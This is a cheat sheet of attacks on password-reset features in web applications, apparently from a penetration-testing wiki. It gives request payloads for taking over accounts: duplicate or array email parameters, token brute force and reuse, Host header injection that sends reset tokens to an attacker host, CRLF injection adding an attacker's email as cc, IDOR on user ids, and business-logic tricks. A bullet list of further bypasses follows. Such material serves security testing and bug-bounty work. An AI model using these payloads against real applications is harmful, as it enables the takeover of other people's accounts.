---
description: Below are some references for the Password Reset Functionality attacks.
---

# Password Reset Functionality

## Concept

In this vulnerability attacker tries to attack the password rest functionality of the application, if the attacker is successful in doing so this might lead to full account takeover, Below are some way to exploit this attack.

## Ways to bypass

### Include your email as second parameter

```
POST  /reset
[....]
email=victim@xyz.com&email=attacker@abc.com
```

### Brute force the password reset token

```
POST  /reset
[....]
email=victim@xyz.com&token={bruteforce}
```

### Try to use reset token to victims account

```
POST  /reset
[....]
email=victim@xyz.com&token={yourtoken}
```

### Host header injection (try changing the host, this might lead to passing the token to attackers server)

```
POST  /reset
Host: Attacker.com
```

### Try figuring how the tokens are generated

```
Like
They might be generated based on timestamp.
They might be generated based on the user id.
They might be generated based on the email id.
```

### CRLF Injection

```
POST  /reset
[....]
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```

```
 CLRF: 
 POST /resetPassword?0a%0dHost:atracker.tld (x-host, true-client-ip, x-forwarded...)
```

### Business logic

```markup
While inviting users into your account/organization, 
you can also try inviting company emails and add a new field
"password": "example123". or "pass": "example123" in the 
request. you may end up resetting a user password.
(company email can be found here 
hunter.io)
```

### JSON array

```
POST  /reset
[....]
{"email":["victim@mail.tld","atracker@mail.tld"]}
```

### Token leakage via refer header

```
POST  /reset
[....]
Referer:https://xyz.com/token={token}
```

### IDOR for password reset (we can change the id parameter)

```
POST  /reset
[....]
id=1234&
```

### Some other ways

* Race condition
* Completely remove the token
* change it to 00000000...
* use null/nil value
* try expired token
* Reusing the old password reset token
* try an array of old tokens
* change 1 char at the begin/end to see if the token is evaluated
* use unicode char jutzu to spoof email address
* try victim@email.com\&attacker@email.com use %20 or | as separators
* change request method (get, put, post etc) and/or content type (xml<>json)
* match bad response and replace with good one
* use super long string
